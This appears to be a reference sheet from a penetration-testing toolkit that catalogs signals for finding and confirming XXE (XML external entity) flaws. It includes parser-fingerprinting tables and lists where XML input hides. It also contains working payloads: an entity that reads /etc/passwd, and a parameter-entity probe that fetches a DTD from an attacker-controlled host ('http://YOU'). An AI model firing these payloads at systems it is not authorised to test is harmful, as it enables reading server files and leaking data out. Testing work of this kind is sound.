# Detection Signals — the complete observable catalog

## The "an XML parser exists" tier — the prerequisite

Before entities matter, confirm an XML parser sees your bytes:

- `Content-Type: application/xml`/`text/xml`/`application/soap+xml`/
  `application/atom+xml`/`application/rss+xml`/`image/svg+xml` accepted
- the response is a SOAP `Fault`/`parse` error — a parser ran
- `?wsdl`/`WSDL`/`metadata` endpoint returns XML
- `X-Powered-By`/`Server` headers hint at an XML-heavy stack (`Axis`,
  `CXF`, `JaxWS`, `WebLogic`, `Tomcat`, `JBoss`, `IIS`)
- a `text/xml` request gets a DIFFERENT response than `application/json`
  — the content-type router exists

## The "entities expand" tier — the class confirm

The discriminator — a benign entity that only lands if the parser
expands it:

```xml
<!DOCTYPE r [<!ENTITY probe "XXE_PROBE">]><r>&probe;</r>
```

- `XXE_PROBE` appears in the response where `&probe;` was → expansion live
- `&probe;` echoes literally → no expansion (or no parse)
- error → parser exists but entities refused → `denied-conditions.md`

The next tier — `&undefined;` — the entity-not-found error fingerprints
the parser:

```xml
<r>&undefined;</r>
```

## The "the error fingerprints the parser" tier

| Error phrase | Parser |
|---|---|
| `SAXParseException`/`org.xml.sax`/`xerces` | Java |
| `XmlException`/`System.Xml`/`DTD is prohibited` | .NET |
| `libxml`/`DOMDocument`/`simplexml` warning | PHP |
| `XMLSyntaxError`/`lxml.etree`/`ParseError`/`ExpatError`/`xml.etree`/`xml.sax`/`defusedxml` | Python |
| `REXML`/`Nokogiri`/`REXML::ParseException` | Ruby |
| `Expat`/`xml2js`/`sax`/`xmldom`/`fast-xml-parser` | Node |
| `encoding/xml`/`XML syntax error` | Go |
| `MSXML`/`Microsoft.XMLDOM` | classic ASP/Windows |

## The "external entities resolve" tier — the next rung

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

- `root:x:0:0:` in the response → external entities live, in-band
- empty/error → external blocked or file missing → `denied-conditions.md`

## The "param-entities + external DTD" tier — OOB live

```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/x.dtd">%d;]><r/>
```

- your `oob_listener` logs `GET /x.dtd` → param-entity + fetch live
- nothing → egress dead or param-entities blocked → `denied-conditions.md`

## The "the response differs" tier — differential probes

Baseline vs entity request — diff the response:
- status code change (200→500, 200→400)
- body-length delta (the file content's length)
- error text mentioning the URI
- timing delta (a fetch takes time — the egress oracle)
- a new `Location:`/`Content-Location` header

## The "the feature parses XML" tier — where XML hides

- `?xml=`/`data=`/`payload=` params that take XML
- `xml`/`config`/`import`/`upload` form fields
- `.svg`/`.docx`/`.xlsx`/`.xml`/`.plist`/`.rss` file uploads
- SAML `SAMLResponse`/`SAMLRequest` params
- SOAP/XML-RPC endpoints (`?wsdl`, `text/xml`, `SOAPAction`)
- `xml` inside a JSON field (`{"xml": "<...>"}`)
- WebDAV `PROPFIND`/`REPORT`/`MKCALENDAR`/`LOCK` bodies

## The "the parser is a lib, not the app" tier — second-order signals

- a `convert xml→json` endpoint — a conversion lib parses
- a `signature-verify`/`saml` path — a sig lib parses
- a `xpath`/`xquery` endpoint — an XPath lib parses the doc
- an `import`/`process`/`render` pipeline — a lib parses later
- a `metadata`/`wsdl`/`config` fetch — a config lib parses

## The "the stack hints XML" tier — passive recon

- `.asmx`/`.svc`/`axis2`/`cxf`/`spring-ws`/`metro` paths
- `weblogic`/`websphere`/`jboss`/`tomcat` server headers
- `X-Transaction`/`X-Oracle`/`X-WebLogic` headers
- `ws-security`/`soap`/`wss` in paths
- a `web.xml`/`struts.xml`/`persistence.xml`/`context.xml` reference in
  a leak or error

## The "it's not XXE" tier — rule-outs

- XPath injection — no DOCTYPE, no entities — `'`/`or` in an XPath
- Billion Laughs — DoS, not read — `billion-laughs.md`
- XML Signature Wrapping — the signature, not the entity — auth bypass
- XSLT injection — `xml-stylesheet`/`<xsl:>` — a different mechanism —
  `xxe-to-rce.md` treats it as adjacent
- `xml:id`/`xml:base`/`xml:lang` — XML features, not entities
- A `CDATA`/`comment`-only doc — no entities — dead

## The recorded-signal shape — for the ledger

```
--hypothesis-id h1 --verdict confirms --evidence-kind class
--evidence "root:x:0:0:root:/root:/bin/bash" --response "<full body>"
```

The `&probe;` echo is `evidence-kind class`; the `file:`-read content
is `evidence-kind impact`.
